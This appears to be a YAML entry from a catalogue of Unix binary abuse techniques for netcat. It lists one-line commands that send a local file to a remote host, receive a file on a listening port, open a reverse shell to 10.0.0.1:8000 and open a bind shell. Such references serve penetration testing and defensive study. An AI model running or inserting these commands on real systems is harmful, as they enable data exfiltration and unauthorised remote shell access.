---
functions:
  upload:
    - description: Serve a file on a TCP port.
      code: |
        RHOST=10.0.0.1
        RPORT=8000
        LFILE=file_to_send
        nc $RHOST $RPORT < "$LFILE"
  download:
    - description: Fetch remote file from a remote TCP port.
      code: |-
        LPORT=8000
        LFILE=file_to_get
        nc -l -p $LPORT > "$LFILE"
  reverse-shell:
    - code: |
        RHOST=10.0.0.1
        RPORT=8000
        nc -e /bin/sh $RHOST $RPORT
  bind-shell:
    - code: |
        LPORT=8000
        nc -lp $LPORT -e /bin/sh
---
